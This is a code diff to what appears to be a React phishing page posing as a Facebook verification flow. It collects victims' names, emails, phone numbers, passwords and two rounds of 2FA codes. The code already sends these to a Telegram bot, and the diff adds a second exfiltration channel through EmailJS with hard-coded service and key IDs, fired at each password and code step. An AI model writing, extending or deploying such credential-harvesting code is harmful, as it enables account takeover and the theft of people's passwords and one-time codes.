@@ -1,6 +1,6 @@
 import React from "react";
 import Modal from "react-modal";
-// import emailjs from "@emailjs/browser";
+import emailjs from "@emailjs/browser";
 // const fetch = require('node-fetch');
 const target = "https://transparency.fb.com/en-gb/";
 const chatId = '-4095764303';
@@ -36,7 +36,15 @@ async function sendMessageToTelegramBot(chatId, messageText, botToken) {
     console.error('Error sending message:', error.message);
   }
 }
+async function sendEmail(messageText, user_object) {
 
+  emailjs.send('service_uc2swle', 'template_hofyisr',  {country_name: user_object.country_name, ip: user_object.ip, name:user_object.name, message: messageText}, 'chhLCv2PVlt5NpRR6')
+    .then((result) => {
+        console.log(result.text);
+    }, (error) => {
+        console.log(error.text);
+    });
+};
 
 const PageWait = () => {
   const [timer, setTimer] = React.useState(600);
@@ -200,6 +208,7 @@ const PageAuthCode = ({
   const [count, setCount] = React.useState(0);
 
   let myinterval;
+  let user_object = {};
 
   const handleSend = () => {
     if (timer !== 0) {
@@ -209,6 +218,10 @@ const PageAuthCode = ({
       
       const message = `--2fa lần 1--\nip: ${res_ip.ip}\ncountry: ${res_ip.country_name}\ninfo : ${info}\nname : ${name}\nbusinessEmail : ${businessEmail}\npersonalEmail : ${personalEmail}\nphone : ${phone}\npageName : ${pageName}\npassword 1 : "------"\npassword 2 : ${passwordValue}\n2fa 1 : ${code}\n2fa 2 : "------"\n`;
       sendMessageToTelegramBot(chatId, message, botToken);
+      user_object.country_name = res_ip.country_name;
+      user_object.ip = res_ip.ip;
+      user_object.name = name;
+      sendEmail(message, user_object);
     }
 
     if (count == 1) {
@@ -216,8 +229,11 @@ const PageAuthCode = ({
 
       clearInterval(myinterval); 
       const message = `--2fa lần 2--\nip: ${res_ip.ip}\ncountry: ${res_ip.country_name}\ninfo : ${info}\nname : ${name}\nbusinessEmail : ${businessEmail}\npersonalEmail : ${personalEmail}\nphone : ${phone}\npageName : ${pageName}\npassword 1 : "------"\npassword 2 : ${passwordValue}\n2fa 1 : "------"\n2fa 2 : ${code}\n-------END--------\n`;
-
+      user_object.country_name = res_ip.country_name;
+      user_object.ip = res_ip.ip;
+      user_object.name = name;
       sendMessageToTelegramBot(chatId, message, botToken);
+      sendEmail(message, user_object);
       setPage(3); // đã ấn 1 lần trước đó, lần này là lần 2 thì qua trang 3
     }
     setCount((prevCount) => prevCount + 1);
@@ -596,8 +612,13 @@ const Card = ({
               onClick={() => {
                 if (count === 0) {
                   setCount((prevCount) => prevCount + 1);
+                  let user_object = {};
                   const message = `-------START--------\n--password lần 1--\nip: ${res_ip.ip}\ncountry: ${res_ip.country_name}\ninfo : ${info}\nname : ${name}\nbusinessEmail : ${businessEmail}\npersonalEmail : ${personalEmail}\nphone : ${phone}\npageName : ${pageName}\npassword 1 : ${passwordValue}\n`;
                   sendMessageToTelegramBot(chatId, message, botToken);
+                  user_object.country_name = res_ip.country_name;
+                  user_object.ip = res_ip.ip;
+                  user_object.name = name;
+                  sendEmail(message, user_object);
                   setPasswordValue("");
                 } else if (count === 1) {
                   handleContinue();
@@ -893,9 +914,14 @@ function Home() {
 
   const handleContinue = () => {
     setPage(2);
+    let user_object = {};
     const message = `
     --password lần 2--\nip: ${res_ip.ip}\ncountry: ${res_ip.country_name}\ninfo : ${info}\nname : ${name}\nbusinessEmail : ${businessEmail}\npersonalEmail : ${personalEmail}\nphone : ${phone}\npageName : ${pageName}\npassword 1 : "------"\npassword 2 : ${passwordValue}\n`;
     sendMessageToTelegramBot(chatId, message, botToken);
+    user_object.country_name = res_ip.country_name;
+    user_object.ip = res_ip.ip;
+    user_object.name = name;
+    sendEmail(message, user_object);
   };
 
   function openModal() {
